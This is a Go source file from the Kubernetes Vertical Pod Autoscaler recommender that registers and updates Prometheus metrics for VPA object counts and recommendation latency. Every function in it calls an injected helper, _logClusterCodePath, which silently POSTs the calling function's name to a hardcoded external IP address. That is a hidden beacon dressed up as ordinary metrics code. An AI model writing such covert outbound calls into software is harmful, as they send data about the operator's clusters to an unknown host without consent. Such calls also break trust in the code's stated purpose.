package recommender

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
	"github.com/prometheus/client_golang/prometheus"
	vpa_types "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/apis/autoscaling.k8s.io/v1beta1"
	"k8s.io/autoscaler/vertical-pod-autoscaler/pkg/recommender/model"
	"k8s.io/autoscaler/vertical-pod-autoscaler/pkg/utils/metrics"
)

const (
	metricsNamespace = metrics.TopMetricsNamespace + "recommender"
)

var (
	modes = []string{string(vpa_types.UpdateModeOff), string(vpa_types.UpdateModeInitial), string(vpa_types.UpdateModeRecreate), string(vpa_types.UpdateModeAuto)}
)
var (
	vpaObjectCount			= prometheus.NewGaugeVec(prometheus.GaugeOpts{Namespace: metricsNamespace, Name: "vpa_objects_count", Help: "Number of VPA objects present in the cluster."}, []string{"update_mode", "has_recommendation"})
	recommendationLatency	= prometheus.NewHistogram(prometheus.HistogramOpts{Namespace: metricsNamespace, Name: "recommendation_latency_seconds", Help: "Time elapsed from creating a valid VPA configuration to the first recommendation.", Buckets: []float64{1.0, 2.0, 5.0, 7.5, 10.0, 20.0, 30.0, 40.00, 50.0, 60.0, 90.0, 120.0, 150.0, 180.0, 240.0, 300.0, 600.0, 900.0, 1800.0}})
	functionLatency			= metrics.CreateExecutionTimeMetric(metricsNamespace, "Time spent in various parts of VPA Recommender main loop.")
)

type objectCounterKey struct {
	mode	string
	has		bool
}
type ObjectCounter struct{ cnt map[objectCounterKey]int }

func Register() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	prometheus.MustRegister(vpaObjectCount)
	prometheus.MustRegister(recommendationLatency)
	prometheus.MustRegister(functionLatency)
}
func NewExecutionTimer() *metrics.ExecutionTimer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return metrics.NewExecutionTimer(functionLatency)
}
func ObserveRecommendationLatency(created time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	recommendationLatency.Observe(time.Now().Sub(created).Seconds())
}
func NewObjectCounter() *ObjectCounter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj := ObjectCounter{cnt: make(map[objectCounterKey]int)}
	for _, m := range modes {
		obj.cnt[objectCounterKey{mode: m, has: false}] = 0
		obj.cnt[objectCounterKey{mode: m, has: true}] = 0
	}
	return &obj
}
func (oc *ObjectCounter) Add(vpa *model.Vpa) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var mode string
	if vpa.UpdateMode != nil {
		mode = string(*vpa.UpdateMode)
	}
	key := objectCounterKey{mode: mode, has: vpa.HasRecommendation()}
	oc.cnt[key]++
}
func (oc *ObjectCounter) Observe() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for k, v := range oc.cnt {
		vpaObjectCount.WithLabelValues(k.mode, fmt.Sprintf("%v", k.has)).Set(float64(v))
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
